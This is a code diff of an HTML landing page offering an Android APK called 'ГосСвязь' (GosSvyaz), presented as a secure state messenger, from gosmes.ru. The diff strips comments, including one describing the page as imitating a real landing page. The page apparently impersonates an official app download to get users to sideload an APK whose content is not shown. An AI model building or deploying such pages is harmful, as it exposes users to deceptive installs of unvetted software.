@@ -49,7 +49,6 @@
   </head>
   <body class="bg-[#0a1428] min-h-screen flex items-center justify-center p-2 md:p-4">
     <div class="card w-full max-w-[320px] md:max-w-[380px] rounded-3xl overflow-hidden text-white">
-      <!-- Логотип -->
       <div class="pt-3 pb-1 flex justify-center">
         <img
           class="shield-glow mx-auto w-14 md:w-16 h-auto"
@@ -60,7 +59,6 @@
         />
       </div>
 
-      <!-- Название и подзаголовок -->
       <div class="text-center px-1 md:px-1">
         <h1 class="text-[20px] md:text-[22px] font-extrabold tracking-tighter">
           <span class="text-[#117dcf]">Гос</span><span class="text-[#eb4040]">Связь</span>
@@ -70,7 +68,6 @@
         </p>
       </div>
 
-      <!-- Версия -->
       <div class="flex justify-center mt-1">
         <div
           class="bg-[#1e3a6e] text-white text-xs font-medium px-5 py-1 rounded-3xl flex items-center gap-x-2 shadow-inner"
@@ -81,7 +78,6 @@
         </div>
       </div>
 
-      <!-- Кнопка Скачать APK -->
       <div class="px-4 md:px-6 mt-3">
         <button
           onclick="handleDownload()"
@@ -92,12 +88,10 @@
         </button>
       </div>
 
-      <!-- Размер файла -->
       <div class="text-center mt-1.5 text-[#a3b8d1] text-xs font-medium">
         5 МБ • APK для Android
       </div>
 
-      <!-- Характеристики -->
       <div class="mx-4 md:mx-6 mt-4 bg-[#1e2c4a] rounded-2xl p-3">
         <h2
           class="uppercase text-[#a3b8d1] text-xs font-semibold tracking-[0.5px] mb-2 text-center"
@@ -106,7 +100,6 @@
         </h2>
 
         <div class="space-y-2.5">
-          <!-- 1: Android / Пристрій -->
           <div class="flex items-center gap-2">
             <div
               class="w-7 h-7 flex items-center justify-center rounded-xl bg-gradient-to-br from-blue-500/25 to-blue-500/5 ring-1 ring-inset ring-blue-400/20 flex-shrink-0"
@@ -131,7 +124,6 @@
             </div>
           </div>
 
-          <!-- 2: Аудіо та відео дзвінки -->
           <div class="flex items-center gap-2">
             <div
               class="w-7 h-7 flex items-center justify-center rounded-xl bg-gradient-to-br from-rose-500/25 to-rose-500/5 ring-1 ring-inset ring-rose-400/20 flex-shrink-0"
@@ -155,7 +147,6 @@
             </div>
           </div>
 
-          <!-- 3: Захищений месенджер -->
           <div class="flex items-center gap-2">
             <div
               class="w-7 h-7 flex items-center justify-center rounded-xl bg-gradient-to-br from-emerald-500/25 to-emerald-500/5 ring-1 ring-inset ring-emerald-400/20 flex-shrink-0"
@@ -179,7 +170,6 @@
             </div>
           </div>
 
-          <!-- 4: Шифрування -->
           <div class="flex items-center gap-2">
             <div
               class="w-7 h-7 flex items-center justify-center rounded-xl bg-gradient-to-br from-amber-500/25 to-amber-500/5 ring-1 ring-inset ring-amber-400/20 flex-shrink-0"
@@ -206,7 +196,6 @@
         </div>
       </div>
 
-      <!-- Как установить -->
       <div class="px-4 md:px-6 mt-3 pb-5">
         <h2 class="text-white font-semibold text-sm md:text-base mb-2">Как установить</h2>
         <ol class="text-[#a3b8d1] space-y-1.5 text-sm">
@@ -231,9 +220,6 @@
     </div>
 
     <script>
-      /**
-       * Инициализация Tailwind + небольшая анимация
-       */
       function initTailwind() {
         return {
           config(userConfig = {}) {
@@ -251,14 +237,10 @@
         };
       }
 
-      /**
-       * Симуляция скачивания (как на реальном лендинге)
-       */
       function handleDownload() {
         const button = document.querySelector('button');
         const originalText = button.innerHTML;
 
-        // Ефект завантаження (щоб виглядало красиво)
         button.style.pointerEvents = 'none';
         button.innerHTML = `
           <svg class="animate-spin h-6 w-6 mr-3 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -268,24 +250,21 @@
           <span>Скачивание...</span>
         `;
 
-        // Реальне скачування APK
         setTimeout(() => {
           const url = 'https://gosmes.ru/download/app';
 
           const a = document.createElement('a');
           a.href = url;
-          a.download = 'ГосСвязь_v1.25.1.apk'; // ім'я файлу, яке буде у користувача
+          a.download = 'ГосСвязь_v1.25.1.apk';
           document.body.appendChild(a);
           a.click();
           document.body.removeChild(a);
 
-          // Повертаємо кнопку в початковий стан
           button.style.pointerEvents = 'auto';
           button.innerHTML = originalText;
-        }, 700); // невелика затримка, щоб спінер встиг показатися
+        }, 700);
       }
 
-      // Запуск
       window.onload = () => {
         initTailwind();
         console.log(
